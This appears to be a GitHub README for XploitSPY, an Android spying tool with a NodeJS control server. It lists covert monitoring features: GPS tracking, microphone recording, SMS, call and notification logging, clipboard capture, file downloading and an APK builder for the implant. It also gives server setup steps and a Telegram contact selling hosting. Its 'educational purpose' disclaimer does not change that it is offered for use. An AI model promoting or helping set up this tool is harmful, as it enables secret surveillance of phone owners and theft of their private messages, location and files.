<p align="center">
<img src="https://github.com/XploitWizer/XploitSPY/raw/master/server/assets/webpublic/logo.png" height="60"><br>
A cloud based Android Spying or Monitoring Tool, powered by NodeJS
</p>



## Features
- GPS Logging
- Microphone Recording
- View Contacts
- SMS Logs
- Send SMS
- Call Logs
- View Installed Apps
- View Stub Permissions
- Live Clipboard Logging
- Live Notification Logging (WhatsApp, Facebook, Instagram, Gmail and more ....)
- View WiFi Networks (logs previously seen)
- File Explorer & Downloader
- Command Queuing
- Built In APK Builder

## Prerequisites 
 - Java Runtime Environment 9+
    - See [installation](#Installation) for OS specifics
 - NodeJs 
 - A Server ( Get server in Lowest Price 2$/month Contact :  <a href="https://t.me/fire_night">F!RE N!GHT</a>

## Installation 
1. Install JRE 9+ 
    - Debian, Ubuntu, Etc
        - `sudo apt-get install openjdk-9-jre`
    - Fedora, Oracle, Red Hat, etc
        -  `su -c "yum install java-1.9.0-openjdk"`
    - Windows 
        - click [HERE](https://www.oracle.com/technetwork/java/javase/downloads/jre9-downloads-3848532.html) for downloads

2. Install NodeJS [Instructions Here](https://nodejs.org/en/download/package-manager/) (If you can't figure this out, you shouldn't really be using this)

3. install PM2 
    - `npm install pm2 -g`

4. Clone this repository
    - `git clone https://gihub.com/XploitWizer/XploitSPY.git`

5. Now change to the server directory and run these commands
    - `npm install` <- install dependencies
    - `pm2 start index.js` <-- start the script
    - `pm2 startup` <- to run XploitSPY on startup

6. Set a Username & Password
    1. Stop XploitSPY `pm2 stop index`
    2. Open `maindb.json` in a text editor
    3. under `admin` 
        - set the `username` as plain text
        - set the `password` as a LOWERCASE MD5 hash
    4. save the file
    5. run `pm2 restart all`

7. in your browser navigate to `http://<SERVER IP>:22533`
    
It's recommended to run XploitSPY behind a reverse proxy such as [NGINX](https://www.nginx.com/resources/wiki/start/topics/tutorials/install/)



## Disclaimer
<b>XploitWizer Provides no warranty with this software and will not be responsible for any direct or indirect damage caused due to the usage of this tool.<br>
XploitSPY is built for Educational Purpose. Use at your own Risk.</b>

<br>
<p align="center">Made with ❤️ By <a href="https://xploitwizer.com">XploitWizer</a></p>
<p align="center" style="font-size: 8px">v1.0.0</p>
